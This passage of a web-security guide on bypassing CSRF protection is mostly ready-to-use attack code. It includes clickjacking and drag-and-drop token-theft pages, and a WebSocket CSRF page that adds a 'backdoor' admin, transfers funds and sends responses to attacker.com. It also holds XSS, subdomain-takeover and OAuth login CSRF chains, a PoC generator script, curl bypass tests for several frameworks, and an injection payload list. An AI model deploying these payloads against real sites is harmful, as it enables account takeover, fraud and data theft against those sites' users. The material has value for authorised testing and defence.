  TARGET_BASE="https://target.com"
  COOKIE="session=valid_session"

  # Get a valid token
  TOKEN=$(curl -s -b "$COOKIE" "$TARGET_BASE/account/settings" | \
    grep -oP 'csrf_token.*?value="([^"]+)"' | head -1 | grep -oP '"[^"]+"' | tr -d '"')

  echo "[*] Captured token: $TOKEN"

  # Test reuse on same endpoint
  echo -n "[1] Same endpoint, 2nd use: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test1@test.com&csrf_token=$TOKEN" "$TARGET_BASE/account/email"
  echo ""

  # Wait and test again
  sleep 5
  echo -n "[2] Same endpoint after 5s: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test2@test.com&csrf_token=$TOKEN" "$TARGET_BASE/account/email"
  echo ""

  # Test on different endpoint
  echo -n "[3] Different endpoint (password): "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "new_password=Test123!&csrf_token=$TOKEN" "$TARGET_BASE/account/password"
  echo ""

  # Test with different session
  echo -n "[4] Different session: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=DIFFERENT_SESSION" \
    -d "email=test3@test.com&csrf_token=$TOKEN" "$TARGET_BASE/account/email"
  echo ""

  # Test after logout/login
  echo -n "[5] After new login: "
  NEW_SESSION=$(curl -s -c- -d "username=attacker&password=pass" \
    "$TARGET_BASE/login" 2>/dev/null | grep session | awk '{print $NF}')
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=$NEW_SESSION" \
    -d "email=test4@test.com&csrf_token=$TOKEN" "$TARGET_BASE/account/email"
  echo ""
  ```
  ::

  :::
::

## Bypass Technique 12 — Clickjacking + CSRF Chain

::tabs
  :::tabs-item{icon="i-lucide-code" label="Iframe Overlay Attack"}
  ```html [clickjacking-csrf.html]
  <!DOCTYPE html>
  <html>
  <head>
  <style>
  body { margin: 0; }
  .decoy {
    position: absolute;
    width: 500px;
    height: 300px;
    z-index: 2;
    background: white;
    padding: 20px;
  }
  .decoy button {
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
    background: #4CAF50;
    color: white;
    border: none;
    border-radius: 5px;
    position: absolute;
    top: 170px;
    left: 130px;
  }
  iframe {
    position: absolute;
    width: 500px;
    height: 300px;
    z-index: 3;
    opacity: 0.0001;
    border: none;
  }
  </style>
  </head>
  <body>
  <div class="decoy">
    <h2>🎉 Congratulations!</h2>
    <p>You've won a $100 gift card!</p>
    <button>Claim Prize</button>
  </div>

  <!-- Transparent iframe positioned so "Delete Account" button aligns with "Claim Prize" -->
  <iframe src="https://target.com/account/delete-confirm"></iframe>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Drag & Drop Token Extraction"}
  ```html [drag-drop-csrf.html]
  <!DOCTYPE html>
  <html>
  <head>
  <style>
  #source { width: 200px; height: 50px; background: #eee; border: 2px dashed #999; 
            text-align: center; line-height: 50px; cursor: grab; }
  #target { width: 200px; height: 50px; background: #cfc; border: 2px solid #6c6;
            text-align: center; line-height: 50px; margin-top: 20px; }
  iframe { position: absolute; opacity: 0.0001; top: 10px; left: 10px; }
  </style>
  </head>
  <body>
  <h2>Drag the prize to the box below!</h2>

  <!-- Hidden iframe with CSRF token visible -->
  <iframe src="https://target.com/account/settings" id="tokenFrame" 
          width="300" height="100"></iframe>

  <div id="source" draggable="true">🎁 Your Prize</div>
  <div id="target">Drop Here</div>

  <script>
  // Victim drags content from iframe (including CSRF token)
  // into attacker's page, revealing the token
  document.getElementById('target').addEventListener('drop', function(e) {
    e.preventDefault();
    var data = e.dataTransfer.getData('text/html');
    // Extract CSRF token from dragged HTML content
    var match = data.match(/csrf_token.*?value="([^"]+)"/);
    if (match) {
      var token = match[1];
      // Use stolen token for CSRF
      fetch('https://target.com/account/email', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'email=attacker@evil.com&csrf_token=' + token
      });
    }
  });
  document.getElementById('target').addEventListener('dragover', function(e) {
    e.preventDefault();
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="X-Frame-Options Check"}

  ::code-preview
  Check if clickjacking is possible (prerequisite).

  #code
  ```bash
  #!/bin/bash
  TARGET="https://target.com/account/settings"

  echo "[*] Clickjacking Defense Check"

  HEADERS=$(curl -sI "$TARGET")

  # X-Frame-Options
  XFO=$(echo "$HEADERS" | grep -i "X-Frame-Options" | tr -d '\r')
  if [ -n "$XFO" ]; then
    echo "  X-Frame-Options: $XFO"
  else
    echo "  \033[91mX-Frame-Options: NOT SET (clickjackable!)\033[0m"
  fi

  # Content-Security-Policy frame-ancestors
  CSP=$(echo "$HEADERS" | grep -i "Content-Security-Policy" | tr -d '\r')
  if echo "$CSP" | grep -qi "frame-ancestors"; then
    echo "  CSP frame-ancestors: $(echo "$CSP" | grep -oP "frame-ancestors[^;]*")"
  else
    echo "  \033[91mCSP frame-ancestors: NOT SET\033[0m"
  fi

  # Test actual iframe embedding
  echo ""
  echo "[*] Testing iframe embedding..."
  cat << 'EOF' > clickjack_test.html
  <html><body>
  <h1>Clickjacking Test</h1>
  <iframe src="TARGET_URL" width="800" height="600" style="border:2px solid red"></iframe>
  <p>If the page loads above, clickjacking is possible.</p>
  </body></html>
  EOF
  sed -i "s|TARGET_URL|$TARGET|g" clickjack_test.html
  echo "[+] Test file: clickjack_test.html"
  echo "[+] Open in browser to verify"
  ```
  ::

  :::
::

## Bypass Technique 13 — WebSocket CSRF

::collapsible

```html [websocket-csrf.html]
<html>
<body>
<script>
/*
WebSocket connections do NOT enforce CORS or SameSite the same way.
The initial HTTP upgrade sends cookies (including SameSite=Lax in some browsers).
WebSocket endpoints rarely have CSRF protection.
*/

var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
  console.log('[+] WebSocket connected');
  
  // Send state-changing commands via WebSocket
  ws.send(JSON.stringify({
    action: 'update_email',
    email: 'attacker@evil.com'
  }));
  
  ws.send(JSON.stringify({
    action: 'change_password',
    new_password: 'H4ck3d2024!'
  }));
  
  ws.send(JSON.stringify({
    action: 'add_admin',
    username: 'backdoor',
    role: 'admin'
  }));
  
  ws.send(JSON.stringify({
    action: 'transfer_funds',
    to: 'attacker_account',
    amount: 10000
  }));
};

ws.onmessage = function(evt) {
  // Exfiltrate responses
  navigator.sendBeacon('https://attacker.com/ws-csrf-log', evt.data);
};
</script>
</body>
</html>
```

::

## Bypass Technique 14 — Subdomain-Based CSRF

::tabs
  :::tabs-item{icon="i-lucide-code" label="XSS on Subdomain"}
  ```html [subdomain-xss-csrf.html]
  <!--
  XSS on blog.target.com → same-site context → all cookies sent
  This bypasses SameSite=Strict AND CSRF tokens (steal from DOM)
  -->

  <!-- Inject via XSS on blog.target.com: -->
  <script>
  // Step 1: Fetch target page to extract CSRF token
  fetch('https://target.com/account/settings', {
    credentials: 'include'
  })
  .then(r => r.text())
  .then(html => {
    // Step 2: Extract CSRF token
    var match = html.match(/csrf_token.*?value="([^"]+)"/);
    if (match) {
      var token = match[1];
      
      // Step 3: Perform CSRF with valid token
      fetch('https://target.com/account/email', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-CSRF-Token': token
        },
        body: 'email=attacker@evil.com&csrf_token=' + token
      });
    }
  });
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Subdomain Takeover + CSRF"}
  ```html [subdomain-takeover-csrf.html]
  <!--
  Dangling CNAME subdomain (old.target.com → unclaimed.herokuapp.com)
  Attacker claims the subdomain → serves CSRF from same-site context
  -->

  <!-- Hosted on taken-over old.target.com -->
  <html>
  <body>
  <script>
  // Same-site context: SameSite=Lax/Strict cookies sent
  // Can also set cookies for .target.com domain

  // Set a CSRF cookie for double-submit bypass
  document.cookie = "csrf_token=ATTACKER_VALUE; domain=.target.com; path=/";

  // CSRF form submission
  var form = document.createElement('form');
  form.action = 'https://target.com/account/email';
  form.method = 'POST';
  form.innerHTML = '<input name="email" value="attacker@evil.com">' +
                   '<input name="csrf_token" value="ATTACKER_VALUE">';
  document.body.appendChild(form);
  form.submit();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Subdomain Enumeration"}

  ::code-preview
  Find subdomains for same-site CSRF attacks.

  #code
  ```bash
  #!/bin/bash
  DOMAIN="${1:-target.com}"

  echo "[*] Enumerating subdomains for $DOMAIN"

  # Subfinder
  subfinder -d "$DOMAIN" -silent 2>/dev/null | tee subs_subfinder.txt

  # Amass passive
  amass enum -d "$DOMAIN" -passive 2>/dev/null | tee subs_amass.txt

  # crt.sh
  curl -s "https://crt.sh/?q=%25.${DOMAIN}&output=json" | \
    jq -r '.[].name_value' 2>/dev/null | sort -u | tee subs_crtsh.txt

  # Merge and deduplicate
  cat subs_*.txt | sort -u > all_subs.txt
  echo "[+] Total unique subdomains: $(wc -l < all_subs.txt)"

  # Check for dangling CNAMEs (subdomain takeover candidates)
  echo ""
  echo "[*] Checking for dangling CNAMEs..."
  while read sub; do
    cname=$(dig +short CNAME "$sub" 2>/dev/null)
    if [ -n "$cname" ]; then
      resolved=$(dig +short "$cname" 2>/dev/null)
      if [ -z "$resolved" ]; then
        echo "  \033[91m[TAKEOVER?] $sub → $cname (UNRESOLVED)\033[0m"
      fi
    fi
  done < all_subs.txt

  # Check for XSS on subdomains (basic reflection test)
  echo ""
  echo "[*] Testing for reflected parameters on subdomains..."
  cat all_subs.txt | httpx -silent | while read url; do
    reflected=$(curl -s "${url}/?q=csrf_xss_test_12345" | grep -c "csrf_xss_test_12345")
    if [ "$reflected" -gt 0 ]; then
      echo "  \033[93m[REFLECTED] ${url}/?q=<input>\033[0m"
    fi
  done
  ```
  ::

  :::
::

## Bypass Technique 15 — Login CSRF

::callout{icon="i-lucide-info" color="blue"}
Login CSRF forces the victim to authenticate as the attacker. The victim then unknowingly performs actions (entering credit card, connecting accounts) under the attacker's session.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Login CSRF Attack"}
  ```html [login-csrf.html]
  <html>
  <body>
  <!--
  Login CSRF: Force victim to log in as attacker
  Then victim adds their payment method / links their account to attacker's
  -->

  <!-- Step 1: Force login as attacker -->
  <iframe name="login_frame" style="display:none"></iframe>
  <form action="https://target.com/login" method="POST" target="login_frame">
    <input type="hidden" name="username" value="attacker_account">
    <input type="hidden" name="password" value="attacker_password">
  </form>

  <script>
  document.forms[0].submit();
  
  // Step 2: After login, redirect to sensitive page
  setTimeout(function() {
    // Victim is now logged in as attacker
    // Redirect to payment/account linking page
    window.location = 'https://target.com/account/add-payment';
    // Victim enters THEIR credit card into ATTACKER's account
  }, 3000);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="OAuth Login CSRF"}
  ```html [oauth-login-csrf.html]
  <html>
  <body>
  <!--
  OAuth Login CSRF: Force victim to connect their OAuth account 
  (GitHub, Google, etc.) to the attacker's application account
  
  Intercept the attacker's OAuth callback URL (with auth code)
  and make the victim's browser use it
  -->

  <script>
  // Attacker's OAuth callback with their auth code
  // The auth code links the OAuth provider account to whoever uses it
  window.location = 'https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE&state=ATTACKER_STATE';
  
  // After this, victim's session is linked to attacker's OAuth account
  // OR attacker's account gets linked to victim's OAuth identity
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Login CSRF Test"}

  ::code-preview
  Test if login form has CSRF protection.

  #code
  ```bash
  # Check login form for CSRF token
  curl -s https://target.com/login | grep -iE "(csrf|token|nonce|authenticity)" | head -5

  # Test login without CSRF token
  curl -s -o /dev/null -w "Login without token: %{http_code}\n" \
    -X POST -d "username=testuser&password=testpass" \
    https://target.com/login

  # Test if login sets SameSite on session cookie
  curl -sI -X POST -d "username=testuser&password=testpass" \
    https://target.com/login | grep -i "set-cookie"
  ```
  ::

  :::
::

## Comprehensive PoC Generator

::code-collapse

```python [csrf_poc_generator.py]
#!/usr/bin/env python3
"""Universal CSRF PoC Generator — generates exploit HTML for discovered bypasses"""

import argparse
import sys
import json
from urllib.parse import urlparse, urlencode

class CSRFPoCGenerator:
    def __init__(self, target, method, params, bypass_type, content_type=None):
        self.target = target
        self.method = method.upper()
        self.params = params  # dict of key:value
        self.bypass_type = bypass_type
        self.content_type = content_type

    def gen_auto_submit_form(self):
        """Standard auto-submitting form"""
        inputs = '\n    '.join(
            f'<input type="hidden" name="{k}" value="{v}">'
            for k, v in self.params.items()
        )
        return f'''<html>
<body>
<form action="{self.target}" method="{self.method}" id="csrf_form">
    {inputs}
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>'''

    def gen_no_token(self):
        """Remove CSRF token parameter"""
        filtered = {k: v for k, v in self.params.items()
                   if not any(t in k.lower() for t in ['csrf', 'token', 'nonce', 'xsrf', 'authenticity'])}
        inputs = '\n    '.join(
            f'<input type="hidden" name="{k}" value="{v}">'
            for k, v in filtered.items()
        )
        return f'''<html>
<body>
<!-- CSRF Bypass: Token parameter removed -->
<form action="{self.target}" method="{self.method}" id="csrf_form">
    {inputs}
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>'''

    def gen_method_switch(self):
        """POST to GET method switch"""
        qs = urlencode(self.params)
        return f'''<html>
<body>
<!-- CSRF Bypass: Method switch POST → GET -->
<img src="{self.target}?{qs}" style="display:none">
<script>
// Alternative: top-level navigation
// window.location = "{self.target}?{qs}";
</script>
</body>
</html>'''

    def gen_text_plain_json(self):
        """JSON CSRF via text/plain form"""
        json_body = json.dumps(self.params)
        # Split JSON to fit form name=value format
        split_point = json_body.rfind(',')
        if split_point > 0:
            name_part = json_body[:split_point+1] + '"dummy":"'
            value_part = '"}'
        else:
            name_part = json_body[:-1] + ',"dummy":"'
            value_part = '"}'
        
        return f'''<html>
<body>
<!-- CSRF Bypass: JSON via text/plain enctype -->
<form action="{self.target}" method="POST" enctype="text/plain" id="csrf_form">
    <input type="hidden" name='{name_part}' value='{value_part}'>
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>'''

    def gen_fetch_text_plain(self):
        """Fetch API with text/plain (no preflight)"""
        return f'''<html>
<body>
<!-- CSRF Bypass: Fetch with text/plain Content-Type -->
<script>
fetch('{self.target}', {{
  method: 'POST',
  credentials: 'include',
  headers: {{ 'Content-Type': 'text/plain' }},
  body: JSON.stringify({json.dumps(self.params)})
}});
</script>
</body>
</html>'''

    def gen_no_referer(self):
        """Suppress Referer header"""
        inputs = '\n    '.join(
            f'<input type="hidden" name="{k}" value="{v}">'
            for k, v in self.params.items()
        )
        return f'''<html>
<head>
<!-- CSRF Bypass: Suppress Referer header -->
<meta name="referrer" content="no-referrer">
</head>
<body>
<form action="{self.target}" method="{self.method}" id="csrf_form">
    {inputs}
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>'''

    def gen_null_origin(self):
        """Null origin via sandboxed iframe"""
        inputs = ''.join(
            f"<input name=\\'{k}\\' value=\\'{v}\\'>"
            for k, v in self.params.items()
        )
        return f'''<html>
<body>
<!-- CSRF Bypass: Null origin via sandboxed iframe -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<form action='{self.target}' method='{self.method}'>
    {inputs}
</form>
<script>document.forms[0].submit();</script>
" style="display:none"></iframe>
</body>
</html>'''

    def gen_samesite_lax_get(self):
        """SameSite=Lax bypass via GET navigation"""
        qs = urlencode(self.params)
        return f'''<html>
<body>
<!-- CSRF Bypass: SameSite=Lax via top-level GET navigation -->
<script>
window.location = '{self.target}?{qs}';
</script>
</body>
</html>'''

    def gen_beacon(self):
        """sendBeacon CSRF"""
        return f'''<html>
<body>
<!-- CSRF Bypass: navigator.sendBeacon -->
<script>
var data = new Blob(
    [JSON.stringify({json.dumps(self.params)})],
    {{type: 'text/plain'}}
);
navigator.sendBeacon('{self.target}', data);
</script>
</body>
</html>'''

    def gen_multi_iframe(self):
        """Multi-action CSRF via iframes"""
        return f'''<html>
<body>
<!-- CSRF: Multiple actions via hidden iframes -->
<script>
var actions = {json.dumps([self.params])};
actions.forEach(function(params, i) {{
    var iframe = document.createElement('iframe');
    iframe.name = 'f' + i;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    var form = document.createElement('form');
    form.action = '{self.target}';
    form.method = '{self.method}';
    form.target = 'f' + i;
    
    for (var key in params) {{
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = params[key];
        form.appendChild(input);
    }}
    
    document.body.appendChild(form);
    setTimeout(function() {{ form.submit(); }}, i * 1000);
}});
</script>
</body>
</html>'''

    def generate(self):
        generators = {
            'no_token': self.gen_no_token,
            'method_switch': self.gen_method_switch,
            'text_plain': self.gen_text_plain_json,
            'fetch_plain': self.gen_fetch_text_plain,
            'no_referer': self.gen_no_referer,
            'null_origin': self.gen_null_origin,
            'samesite_lax': self.gen_samesite_lax_get,
            'beacon': self.gen_beacon,
            'multi_iframe': self.gen_multi_iframe,
            'auto_form': self.gen_auto_submit_form,
        }
        
        if self.bypass_type == 'all':
            results = {}
            for name, gen in generators.items():
                results[name] = gen()
            return results
        
        gen = generators.get(self.bypass_type)
        if gen:
            return {self.bypass_type: gen()}
        else:
            print(f"Unknown bypass type: {self.bypass_type}")
            print(f"Available: {', '.join(generators.keys())}")
            sys.exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CSRF PoC Generator')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-m', '--method', default='POST', help='HTTP method')
    parser.add_argument('-p', '--params', required=True, help='Parameters as JSON')
    parser.add_argument('-b', '--bypass', default='all', help='Bypass type or "all"')
    parser.add_argument('-o', '--output', default='csrf_pocs', help='Output directory')
    
    args = parser.parse_args()
    params = json.loads(args.params)
    
    import os
    os.makedirs(args.output, exist_ok=True)
    
    gen = CSRFPoCGenerator(args.target, args.method, params, args.bypass)
    pocs = gen.generate()
    
    for name, html in pocs.items():
        filename = f"{args.output}/csrf_{name}.html"
        with open(filename, 'w') as f:
            f.write(html)
        print(f"[+] Generated: {filename}")
```

::

::code-preview
Generate all CSRF PoC variations.

#code
```bash
python3 csrf_poc_generator.py \
  -t "https://target.com/account/email" \
  -m POST \
  -p '{"email":"attacker@evil.com","csrf_token":"test"}' \
  -b all \
  -o csrf_pocs/

# Serve the PoCs
python3 -m http.server 8080 --directory csrf_pocs/
```
::

## Burp Suite Integration

::tabs
  :::tabs-item{icon="i-lucide-settings" label="CSRF Token Tracking"}

  ::code-preview
  Configure Burp session handling for CSRF token extraction and insertion.

  #code
  ```
  Burp → Settings → Sessions → Session Handling Rules

  Rule 1: Extract CSRF Token
    Scope: Target scope
    Action: Run macro
    Macro: 
      1. GET /account/settings
      2. Extract: csrf_token from response body
         Regex: name="csrf_token" value="([^"]+)"
    
    After running macro:
      Update parameter: csrf_token
      In: Request body (or header)
      Value: Extracted value from macro

  Rule 2: Remove CSRF for Testing
    Scope: Target scope
    Action: Use custom parameter handling
    Remove: csrf_token from request body
    
  This allows Burp Scanner to automatically test CSRF bypasses
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-settings" label="Match & Replace Rules"}

  | Type | Match | Replace | Purpose |
  | ---- | ----- | ------- | ------- |
  | Request body | `csrf_token=[^&]*` | `` | Remove CSRF token |
  | Request body | `csrf_token=[^&]*` | `csrf_token=` | Empty CSRF token |
  | Request body | `csrf_token=[^&]*` | `csrf_token=aaaa` | Arbitrary value |
  | Request header | `Referer: .*` | `` | Remove Referer |
  | Request header | `Origin: .*` | `` | Remove Origin |
  | Request header | `X-Requested-With: .*` | `` | Remove custom header |
  | Request first line | `POST` | `GET` | Method switch |

  :::

  :::tabs-item{icon="i-lucide-settings" label="Intruder Token Fuzzing"}

  ```http
  POST /account/email HTTP/1.1
  Host: target.com
  Cookie: session=valid
  Content-Type: application/x-www-form-urlencoded

  email=attacker@evil.com&csrf_token=§payload§
  ```

  **Payload list:**
  - (empty)
  - `null`
  - `0`
  - `undefined`
  - `true`
  - `false`
  - `NaN`
  - `[]`
  - `{}`
  - `AAAA`
  - `a]` (format string)
  - `${7*7}` (template injection)
  - `../../../etc/passwd`
  - `VALID_TOKEN_FROM_ATTACKER_SESSION`
  - (1000 char string)
  - `' OR '1'='1`

  :::

  :::tabs-item{icon="i-lucide-scan" label="Extensions"}

  ::code-preview
  Key Burp extensions for CSRF testing.

  #code
  ```
  BApp Store Extensions:

  1. CSRF Scanner
     - Active scanner for CSRF vulnerabilities
     - Tests token removal, empty tokens, method switching
  
  2. CSurfer
     - Generates CSRF PoC HTML automatically
     - Supports form, XHR, and fetch payloads
  
  3. Logger++
     - Filter: Response.headers CONTAINS "csrf"
     - Monitor CSRF token flow across requests
  
  4. CSRF Token Tracker
     - Tracks token generation and validation patterns
     - Detects static tokens and cross-user token acceptance
  
  5. Autorize
     - Test if CSRF tokens are tied to sessions
     - Swap tokens between authenticated users
  
  6. Turbo Intruder
     - Race condition CSRF (use token before rotation)
     - High-speed token brute forcing
  ```
  ::

  :::
::

## Framework-Specific Bypass Patterns

::accordion
  :::accordion-item{icon="i-lucide-code" label="Django — CSRF Middleware Bypass"}
  ```python
  # Django CSRF bypass patterns:
  
  # 1. @csrf_exempt decorator on view
  @csrf_exempt  # Completely disables CSRF
  def sensitive_view(request):
      pass
  
  # 2. Middleware ordering issue
  MIDDLEWARE = [
      'custom.middleware.BeforeCSRF',  # If this modifies request
      'django.middleware.csrf.CsrfViewMiddleware',  # CSRF check may fail
  ]
  
  # 3. CSRF_TRUSTED_ORIGINS too broad
  CSRF_TRUSTED_ORIGINS = [
      'https://*.target.com',  # Trusts all subdomains
  ]
  
  # Detection:
  # grep -rn "csrf_exempt\|CSRF_TRUSTED_ORIGINS\|CSRF_COOKIE_SECURE" --include="*.py"
  ```

  **Bypass test commands:**
  ```bash
  # Django uses csrfmiddlewaretoken in forms and X-CSRFToken header
  # Test without token
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "sessionid=valid; csrftoken=valid" \
    -d "email=test@evil.com" https://target.com/account/email

  # Test with cookie token only (no form field)
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "sessionid=valid; csrftoken=CSRF_VALUE" \
    -d "email=test@evil.com" https://target.com/account/email

  # Test PUT method (Django REST Framework may skip CSRF)
  curl -s -o /dev/null -w "%{http_code}" -X PUT -b "sessionid=valid" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@evil.com"}' https://target.com/api/user/
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Ruby on Rails — Authenticity Token Bypass"}
  ```ruby
  # Rails bypass patterns:
  
  # 1. skip_before_action :verify_authenticity_token
  class ApiController < ApplicationController
    skip_before_action :verify_authenticity_token  # CSRF disabled
  end
  
  # 2. protect_from_forgery with: :null_session
  # Resets session instead of raising error — action still executes
  
  # 3. API mode (no CSRF by default)
  class Api::V1::UsersController < ActionController::API
    # No CSRF protection in API mode
  end
  ```

  **Bypass test commands:**
  ```bash
  # Rails uses authenticity_token
  # Test without token
  curl -s -o /dev/null -w "%{http_code}" -X POST \
    -b "_session=valid" \
    -d "user[email]=attacker@evil.com" \
    https://target.com/users/update

  # Test _method override
  curl -s -o /dev/null -w "%{http_code}" -X POST \
    -b "_session=valid" \
    -d "user[email]=attacker@evil.com&_method=patch" \
    https://target.com/users/update

  # Test JSON Content-Type (API controllers often skip CSRF)
  curl -s -o /dev/null -w "%{http_code}" -X PATCH \
    -b "_session=valid" \
    -H "Content-Type: application/json" \
    -d '{"user":{"email":"attacker@evil.com"}}' \
    https://target.com/users/update
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Laravel — VerifyCsrfToken Bypass"}
  ```php
  // Laravel bypass patterns:
  
  // 1. Excluded URIs in middleware
  class VerifyCsrfToken extends Middleware {
      protected $except = [
          'api/*',           // All API routes excluded
          'webhook/*',       // Webhook routes
          'stripe/*',        // Payment callbacks
      ];
  }
  
  // 2. _token vs _method parameter interaction
  // Laravel checks for _token in POST body or X-CSRF-TOKEN header
  
  // 3. Cookie-based token (XSRF-TOKEN cookie)
  // Laravel sets XSRF-TOKEN cookie that can be read by JS
  // and sent back as X-XSRF-TOKEN header
  ```

  **Bypass test commands:**
  ```bash
  # Laravel uses _token field or X-CSRF-TOKEN header
  # Test API routes (often excluded from CSRF)
  curl -s -o /dev/null -w "%{http_code}" -X POST \
    -b "laravel_session=valid" \
    -d "email=attacker@evil.com" \
    https://target.com/api/user/email

  # Test with _method override
  curl -s -o /dev/null -w "%{http_code}" -X POST \
    -b "laravel_session=valid" \
    -d "email=attacker@evil.com&_method=PUT" \
    https://target.com/user/email

  # Test X-XSRF-TOKEN header (read from cookie)
  XSRF=$(curl -s -c- https://target.com | grep XSRF | awk '{print $NF}')
  curl -s -o /dev/null -w "%{http_code}" -X POST \
    -b "laravel_session=valid; XSRF-TOKEN=$XSRF" \
    -H "X-XSRF-TOKEN: $XSRF" \
    -d "email=attacker@evil.com" \
    https://target.com/user/email
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Express.js — csurf Middleware Bypass"}
  ```javascript
  // Express/csurf bypass patterns:
  
  // 1. CSRF only on specific routes (not global)
  app.post('/sensitive', csrfProtection, handler);
  app.post('/other', handler);  // No CSRF here
  
  // 2. csurf checks multiple locations
  // Token checked in: body._csrf, query._csrf, headers['csrf-token'],
  // headers['xsrf-token'], headers['x-csrf-token'], headers['x-xsrf-token']
  
  // 3. Cookie-based double submit (if using cookie:true)
  // csurf({cookie: true}) — vulnerable to cookie injection
  ```

  **Bypass test commands:**
  ```bash
  # csurf accepts token from multiple sources
  # Test each location

  # No token
  curl -s -o /dev/null -w "No token: %{http_code}\n" -X POST \
    -b "connect.sid=valid" \
    -d "email=attacker@evil.com" \
    https://target.com/account/email

  # Token in query string
  curl -s -o /dev/null -w "Query token: %{http_code}\n" -X POST \
    -b "connect.sid=valid" \
    -d "email=attacker@evil.com" \
    "https://target.com/account/email?_csrf=ATTACKER_TOKEN"

  # Token in various headers
  for header in "csrf-token" "xsrf-token" "x-csrf-token" "x-xsrf-token"; do
    echo -n "  Header $header: "
    curl -s -o /dev/null -w "%{http_code}" -X POST \
      -b "connect.sid=valid" \
      -H "$header: ATTACKER_TOKEN" \
      -d "email=attacker@evil.com" \
      https://target.com/account/email
    echo ""
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Spring Security — CSRF Bypass"}
  ```java
  // Spring Security bypass patterns:
  
  // 1. CSRF disabled entirely
  http.csrf().disable();
  
  // 2. Ignored request matchers
  http.csrf().ignoringRequestMatchers("/api/**", "/public/**");
  
  // 3. CookieCsrfTokenRepository (double-submit)
  http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
  // XSRF-TOKEN cookie readable by JS → double-submit pattern
  // Vulnerable to cookie injection
  
  // 4. GET/HEAD/OPTIONS/TRACE not checked by default
  ```

  **Bypass test commands:**
  ```bash
  # Spring uses X-CSRF-TOKEN header or _csrf parameter
  # Test API endpoints (often CSRF-exempt)
  curl -s -o /dev/null -w "API endpoint: %{http_code}\n" -X POST \
    -b "JSESSIONID=valid" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com"}' \
    https://target.com/api/user/email

  # Test with XSRF-TOKEN cookie (if CookieCsrfTokenRepository used)
  XSRF=$(curl -s -c- https://target.com | grep XSRF | awk '{print $NF}')
  curl -s -o /dev/null -w "Cookie CSRF: %{http_code}\n" -X POST \
    -b "JSESSIONID=valid; XSRF-TOKEN=$XSRF" \
    -H "X-XSRF-TOKEN: $XSRF" \
    -d "email=attacker@evil.com" \
    https://target.com/user/email
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="ASP.NET — AntiForgery Bypass"}
  ```csharp
  // ASP.NET bypass patterns:
  
  // 1. [IgnoreAntiforgeryToken] attribute
  [HttpPost]
  [IgnoreAntiforgeryToken]
  public IActionResult UpdateEmail(string email) { }
  
  // 2. Missing [ValidateAntiForgeryToken] on action
  [HttpPost]  // No [ValidateAntiForgeryToken]
  public IActionResult DeleteAccount() { }
  
  // 3. API controllers don't use anti-forgery by default
  [ApiController]
  public class UsersController : ControllerBase { }
  
  // 4. Cookie-based token (__RequestVerificationToken cookie)
  ```

  **Bypass test commands:**
  ```bash
  # ASP.NET uses __RequestVerificationToken
  # Test without token
  curl -s -o /dev/null -w "No token: %{http_code}\n" -X POST \
    -b ".AspNetCore.Cookies=valid" \
    -d "email=attacker@evil.com" \
    https://target.com/Account/UpdateEmail

  # Test API controller (often no CSRF)
  curl -s -o /dev/null -w "API: %{http_code}\n" -X POST \
    -b ".AspNetCore.Cookies=valid" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com"}' \
    https://target.com/api/user/email
  ```
  :::
::

## Comprehensive Automated Testing Script

::code-collapse

```bash [csrf-full-test.sh]
#!/bin/bash
# Comprehensive CSRF Bypass Testing Script

set -e

TARGET="${1:?Usage: $0 <target_url> <cookie> [post_data]}"
COOKIE="${2:?Usage: $0 <target_url> <cookie> [post_data]}"
POST_DATA="${3:-email=attacker@evil.com}"
OUTPUT="csrf_test_$(date +%Y%m%d_%H%M%S).txt"
DOMAIN=$(echo "$TARGET" | awk -F[/:] '{print $4}')

echo "╔══════════════════════════════════════════════════════╗" | tee "$OUTPUT"
echo "║  COMPREHENSIVE CSRF BYPASS TESTER                    ║" | tee -a "$OUTPUT"
echo "║  Target: $TARGET" | tee -a "$OUTPUT"
echo "║  Domain: $DOMAIN" | tee -a "$OUTPUT"
echo "╚══════════════════════════════════════════════════════╝" | tee -a "$OUTPUT"

FINDINGS=0

test_csrf() {
    local NAME="$1"
